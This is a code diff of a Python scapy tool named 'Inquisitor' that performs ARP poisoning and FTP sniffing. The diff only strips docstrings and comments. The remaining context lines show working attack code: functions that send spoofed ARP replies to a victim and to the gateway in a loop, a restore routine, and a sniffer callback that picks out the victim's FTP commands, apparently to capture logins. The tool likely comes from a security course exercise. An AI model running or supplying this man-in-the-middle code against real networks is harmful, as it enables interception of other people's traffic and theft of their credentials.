@@ -7,7 +7,6 @@ import threading
 from scapy.all import *
 
 def parse_args():
-    """Parse command line arguments."""
     parser = argparse.ArgumentParser(description="ARP Poisoning and FTP Sniffer Tool - Inquisitor")
     parser.add_argument("ip_src", help="Source IP (Gateway/Router IP)")
     parser.add_argument("mac_src", help="Source MAC (Gateway/Router MAC)")
@@ -22,7 +21,6 @@ def parse_args():
     return args
 
 def restore(ip_src, mac_src, ip_target, mac_target):
-    """Send broadcast ARP packets to restore the network."""
     print("\n[*] Restoring ARP tables using broadcast...", flush=True)
     
     l2_broadcast_packet_for_target = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=ip_target, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_src, hwsrc=mac_src)
@@ -33,7 +31,6 @@ def restore(ip_src, mac_src, ip_target, mac_target):
     print("[*] ARP tables restored.", flush=True)
 
 def poison_loop(ip_src, mac_src, ip_target, mac_target):
-    """Send malicious ARP packets in a loop using Layer 2 sendp."""
     l2_packet_for_target = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
     l2_packet_for_gateway = Ether(dst=mac_src) / ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target)
     
@@ -47,8 +44,6 @@ def poison_loop(ip_src, mac_src, ip_target, mac_target):
             break
 
 def ftp_sniffer(packet):
-    """Callback function for each sniffed packet to find FTP commands."""
-    # THE FIX: Only process packets coming FROM our target victim, ignore forwarded packets.
     if not packet.haslayer(IP) or packet[IP].src != args.ip_target:
         return
 
@@ -61,8 +56,6 @@ def ftp_sniffer(packet):
             pass
 
 def main():
-    """Main function."""
-    # Make args global so the sniffer can access ip_target
     global args
     args = parse_args()
     
